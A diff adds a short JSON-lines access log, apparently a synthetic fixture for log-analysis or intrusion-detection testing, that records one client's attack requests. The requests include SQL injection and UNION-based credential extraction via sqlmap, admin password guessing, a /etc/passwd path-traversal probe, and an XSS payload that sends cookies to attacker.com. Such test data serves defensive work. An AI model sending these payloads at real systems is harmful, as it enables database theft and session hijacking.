@@ -1,0 +1,7 @@
+{"timestamp": "2026-09-17T10:25:01Z", "client_ip": "192.168.1.200", "method": "GET", "url": "/api/users?id=1' OR '1'='1", "status": 200, "user_agent": "Mozilla/5.0", "response_time_ms": 42}
+{"timestamp": "2026-09-17T10:25:02Z", "client_ip": "192.168.1.200", "method": "POST", "url": "/api/login", "status": 401, "user_agent": "Mozilla/5.0", "body": "username=admin&pass=123456"}
+{"timestamp": "2026-09-17T10:25:03Z", "client_ip": "192.168.1.200", "method": "POST", "url": "/api/login", "status": 401, "user_agent": "Mozilla/5.0", "body": "username=admin&pass=password"}
+{"timestamp": "2026-09-17T10:25:04Z", "client_ip": "192.168.1.200", "method": "GET", "url": "/api/products?cat=1 UNION SELECT username,password,email FROM users--", "status": 500, "user_agent": "sqlmap/1.6.4"}
+{"timestamp": "2026-09-17T10:25:05Z", "client_ip": "192.168.1.200", "method": "GET", "url": "/admin/console", "status": 403, "user_agent": "sqlmap/1.6.4"}
+{"timestamp": "2026-09-17T10:25:06Z", "client_ip": "192.168.1.200", "method": "GET", "url": "/api/download?file=../../../../etc/passwd", "status": 400, "user_agent": "curl/7.81.0"}
+{"timestamp": "2026-09-17T10:25:07Z", "client_ip": "192.168.1.200", "method": "POST", "url": "/api/feedback", "status": 200, "user_agent": "Mozilla/5.0", "body": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"}
